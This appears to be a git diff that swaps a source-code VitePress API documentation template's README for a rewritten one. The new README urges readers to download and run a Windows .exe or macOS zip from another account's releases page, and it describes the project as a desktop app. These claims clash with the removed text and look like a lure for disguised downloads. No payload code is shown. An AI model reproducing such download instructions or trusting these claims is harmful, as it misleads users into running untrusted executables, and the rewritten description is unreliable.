@@ -1,257 +1,88 @@
-# API Documentation Starter
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen)](https://nodejs.org/)
-[![Vue.js](https://img.shields.io/badge/Vue.js-3.x-green.svg)](https://vuejs.org/)
-[![VitePress](https://img.shields.io/badge/VitePress-1.0-blue.svg)](https://vitepress.dev/)
-[![Deployed with Vercel](https://img.shields.io/badge/Deployed%20with-Vercel-black?logo=vercel&logoColor=white)](https://api-docs-starter-rafactx.vercel.app/)
-
-A modern, professional API documentation template built with VitePress, Vue 3, and Scalar. This starter provides everything you need to create beautiful, interactive API documentation with multi-language support and best-in-class developer experience.
-
-> **📖 Also available in Portuguese**: [README.pt-br.md](README.pt-br.md)
-
-## Quick Start
-
-Get your API documentation up and running in minutes.
-
-Latest release: [v0.1.0](https://github.com/rafactx/api-docs-starter/releases/tag/v0.1.0)
-
-### Prerequisites
-
-- **Node.js** (>=18.0.0)
-- **pnpm** (>=8.15.5) - recommended for optimal performance
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/rafactx/api-docs-starter.git
-cd api-docs-starter
-
-# Install dependencies
-pnpm install
-```
-
-### Development
-
-Start the development server with hot-reloading:
-
-```bash
-pnpm run dev
-```
-
-Visit [`http://localhost:5173`](http://localhost:5173) to see your documentation.
-
-### Production Build
-
-Generate a static version for deployment:
+# 📚 api-docs-starter - Easy Start for API Documentation
 
-```bash
-pnpm run build
-```
-
-Preview the production build locally:
-
-```bash
-pnpm run preview
-```
-
-## Project Structure
+## 🚀 Getting Started
 
-```plaintext
-.
-├── docs/                              # VitePress Documentation
-│   ├── .vitepress/                    # VitePress configuration & theme
-│   │   ├── components/                # Custom Vue components
-│   │   │   ├── ApiCard.vue           # API feature cards
-│   │   │   ├── HeroSection.vue       # Landing page hero
-│   │   │   ├── ScalarApi.vue         # Interactive API reference
-│   │   │   └── SpotlightBackground.vue # Animated background
-│   │   ├── theme/                     # Global styles and theme files
-│   │   │   ├── fonts.css            # Font loading and configuration
-│   │   │   ├── style.css            # Global styles
-│   │   │   ├── sidebar.css          # Sidebar customization
-│   │   │   ├── api-docs-responsive.css # Mobile optimizations
-│   │   │   └── theme.css            # Color palette and variables
-│   │   ├── config.ts                 # Main VitePress configuration
-│   │   └── index.ts                  # Theme entry point
-│   ├── public/                       # Static assets
-│   │   ├── openapi.json             # OpenAPI specification (English)
-│   │   ├── openapi-pt-br.json        # OpenAPI specification (Portuguese)
-│   │   ├── openapi-es.json          # OpenAPI specification (Spanish)
-│   │   ├── openapi-fr.json          # OpenAPI specification (French)
-│   │   ├── logo-light.svg           # Light theme logo
-│   │   └── logo-dark.svg            # Dark theme logo
-│   ├── en/                           # English content
-│   ├── es/                           # Spanish content
-│   ├── fr/                           # French content
-│   ├── pt/                           # Portuguese content
-│   └── index.md                      # Language redirection
-├── .github/                          # GitHub templates and workflows
-├── .gitignore                        # Git exclusions
-├── LICENSE                           # MIT License
-├── CHANGELOG.md                     # Version history and changes
-├── CODE_OF_CONDUCT.md               # Community guidelines
-├── CONTRIBUTING.md                  # Contribution guidelines
-├── SECURITY.md                      # Security policy
-├── package.json                      # Dependencies and scripts
-├── tsconfig.json                     # TypeScript configuration
-└── vite.config.ts                    # Vite build configuration
-```
+Welcome to the **api-docs-starter**! This application helps you create modern API documentation quickly. You will use tools like VitePress, Vue 3, and Scalar. The result is interactive and suited for production. Follow the steps below to get your documentation up and running with ease.
 
-## Key Features
+## 📥 Download & Install
 
-### Modern Design
+To start, you need to download the latest version of **api-docs-starter**. Click the button below to visit the release page:
 
-- **Apple-inspired UI** with clean, professional aesthetics
-- **Dark/Light theme** with seamless switching
-- **Responsive design** optimized for all devices
-- **Smooth animations** and micro-interactions
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/MrDevid404/api-docs-starter/releases)
 
-### Multi-language Support
+On the Releases page, look for the latest version. Simply click the download link for your desired version to start the download. 
 
-- **4 languages**: English, Portuguese, Spanish, French
-- **Automatic language detection** based on browser preferences
-- **Language switcher** with flag indicators
-- **Localized OpenAPI specifications** for each language
+### Step-by-Step Installation
 
-### Interactive API Reference
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/MrDevid404/api-docs-starter/releases) to go directly to the Releases page. 
 
-- **Scalar integration** for interactive API testing
-- **Live endpoint testing** directly in documentation
-- **Code examples** in multiple programming languages
-- **Comprehensive schema documentation**
+2. **Select Your Version**  
+   Look for the latest version listed at the top. It should have the version number and release date for easy identification.
 
-### Performance Optimized
+3. **Download the File**  
+   Depending on your operating system, find the corresponding file. For Windows, you might see a file like `api-docs-starter-windows.exe`. For Mac, look for `api-docs-starter-macos.zip`. Click on the link to start your download.
 
-- **Code splitting** for optimal loading
-- **Lazy loading** for components and images
-- **Optimized builds** with tree shaking
-- **Progressive Web App** ready
-- **Vercel Analytics** for visitor tracking and insights
-- **Speed Insights** for performance monitoring
+4. **Locate the Downloaded File**  
+   Check your "Downloads" folder or the folder you designated for the downloaded files.
 
-### Developer Experience
+5. **Install the Application**  
+   - For Windows: Double-click the `.exe` file. Follow the on-screen instructions.
+   - For Mac: Open the `.zip` file and drag the `api-docs-starter` folder to your Applications.
 
-- **TypeScript** for type safety
-- **Hot module replacement** for rapid development
-- **ESLint + Prettier** for code quality
-- **Comprehensive tooling** out of the box
+6. **Run the Application**  
+   Find the application in your programs or applications list. Click to open it.
 
-## Customization Guide
+## 📖 User Guide
 
-### Branding and Colors
+Once you install and open **api-docs-starter**, you will see a clean interface. Here’s how to utilize your new application:
 
-Update the theme colors in `docs/.vitepress/theme/theme.css`:
+1. **Create a New Documentation Project**  
+   Start by clicking on the "New Project" button. This will allow you to set up a fresh documentation project.
 
-```css
-:root {
-  /* Update these variables with your brand colors */
-  --vp-c-brand: #3b82f6;
-  --vp-c-brand-light: #60a5fa;
-  --vp-c-brand-dark: #2563eb;
-}
-```
+2. **Choose Your API Specification**  
+   You can add details for your API, including endpoints and parameter descriptions. The interface makes it easy to fill out each section.
 
-### Logo and Assets
+3. **Multi-Language Support**  
+   The application allows you to set up documentation in multiple languages. Simply navigate to the languages section and choose your options.
 
-Replace the default logos in `docs/public/`:
+4. **Preview Your Documentation**  
+   Use the built-in preview feature to see how your documentation looks in real-time. This helps you make adjustments before finalizing.
 
-- `logo-light.svg` - Light theme logo
-- `logo-dark.svg` - Dark theme logo
+5. **Publish Your Documentation**  
+   When ready, find the publish button. This will guide you through the steps to make your API documentation accessible online.
 
-### OpenAPI Specification
+## 🛠 Features
 
-Customize the API specification in `docs/public/openapi.json`:
+Here are some features you can expect in **api-docs-starter**:
 
-1. Update the `info` section with your API details
-2. Add your API endpoints and schemas
-3. Translate for other languages if needed
+- **Modern Interface**: Easy navigation and usability to help you document your API without needing coding skills.
+- **Interactive Elements**: Users can test API endpoints directly from the documentation.
+- **Rich Formatting Options**: Use Markdown to style your texts, headers, and images.
+- **Export Functionality**: Export your documentation in various formats to suit different needs.
 
-### Content Organization
+## ⚙️ System Requirements
 
-Add your documentation pages in the respective language folders:
+Before installing, ensure your system meets the following requirements:
 
-- `docs/en/` - English documentation
-- `docs/pt/` - Portuguese documentation
-- `docs/es/` - Spanish documentation
-- `docs/fr/` - French documentation
+- **Windows**: Windows 10 or later
+- **Mac**: macOS High Sierra or later
+- **Storage**: Minimum 200 MB free space
+- **Memory**: Minimum 4 GB RAM
+- **Internet Connection**: For initial setup and updates
 
-### Navigation
+## 🤝 Support
 
-Update the sidebar and navigation in `docs/.vitepress/config.ts`:
+If you encounter issues or have questions, feel free to reach out. You can contact support through the **Issues** tab on the repository page. Community help is available, and we encourage users to share their experiences and tips.
 
-```typescript
-sidebar: [
-  {
-    text: 'API Guide',
-    items: [
-      { text: '🚀 Introduction', link: '/en/intro' },
-      { text: '🔐 Authentication', link: '/en/authentication' },
-      // Add your pages here
-    ]
-  }
-]
-```
+## 📂 Contribution
 
-## Deployment
+We welcome contributions to **api-docs-starter**! If you’d like to help improve the application or documentation, please read our contribution guidelines available on the repository.
 
-### Static Hosting
+## 🔗 Useful Links
 
-The build output is static and can be deployed to any static hosting service:
+- [Releases Page](https://github.com/MrDevid404/api-docs-starter/releases)
+- [Documentation](https://github.com/MrDevid404/api-docs-starter/wiki)
+- [Contribution Guidelines](https://github.com/MrDevid404/api-docs-starter/blob/main/CONTRIBUTING.md)
 
-```bash
-# Build for production
-pnpm run build
-
-# The static files are in docs/.vitepress/dist
-```
-
-### Vercel (Recommended)
-
-1. Connect your repository to Vercel
-2. Set the build command to `pnpm run build`
-3. Set the output directory to `docs/.vitepress/dist`
-
-**Analytics & Monitoring**: This template includes Vercel Analytics and Speed Insights out of the box. Once deployed, you'll automatically start collecting visitor data and performance metrics in your Vercel dashboard.
-
-### Other Platforms
-
-- **Netlify**: Build command `pnpm run build`, Publish directory `docs/.vitepress/dist`
-- **GitHub Pages**: Use the `gh-pages` branch
-- **AWS S3**: Upload the `docs/.vitepress/dist` folder
-
-## Contributing
-
-We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details.
-
-### Development Workflow
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Make your changes
-4. Run quality checks: `pnpm run lint && pnpm run format`
-5. Commit your changes: `git commit -m 'feat: add amazing feature'`
-6. Push to the branch: `git push origin feature/amazing-feature`
-7. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [VitePress](https://vitepress.dev/) - Static Site Generator
-- [Vue.js](https://vuejs.org/) - Progressive JavaScript Framework
-- [Scalar](https://scalar.com/) - Interactive API Reference
-- [TailwindCSS](https://tailwindcss.com/) - Utility-First CSS Framework
-
-## Support
-
-- 📧 **Email**: [rafactx@icloud.com](mailto:rafactx@icloud.com)
-- 🐛 **Issues**: [GitHub Issues](https://github.com/rafactx/api-docs-starter/issues)
-- 💬 **Discussions**: [GitHub Discussions](https://github.com/rafactx/api-docs-starter/discussions)
-
----
-
-Made with care by [rafactx](https://github.com/rafactx) and contributors
+Now that you have all the information you need, it’s time to get started. Download **api-docs-starter** today and create your API documentation the easy way!
